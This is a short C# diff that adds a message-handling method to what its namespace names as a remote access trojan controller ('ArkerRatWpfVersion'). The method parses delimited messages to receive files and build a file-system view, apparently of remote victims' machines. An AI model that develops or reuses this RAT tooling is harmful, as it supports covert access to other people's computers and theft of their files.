@@ -90,6 +90,33 @@ namespace ArkerRatWpfVersion
 
         }
 
+        public void HandleData(string subString)
+        {
+            if (subString.Contains("§UF§"))
+            {
+                subString = subString.Replace("§UF§", string.Empty);
+
+                if (subString.Contains("§start§") && !download)
+                {
+                    subString = subString.Replace("§start§", string.Empty);
+                    Task.Run(() => StartDownloadingFile(subString));
+                }
+                else if (subString == "§end§")
+                {
+                    download = false;
+                    dataBuffer = new ConcurrentQueue<string>();
+                }
+                else
+                {
+                    dataBuffer.Enqueue(subString);
+                }
+            }
+            else
+            {
+                Task.Run(() => GenerateFileSystem(subString));
+            }
+        }
+
         string selector = string.Empty;
         public void GenerateFileSystem(string data)
         {
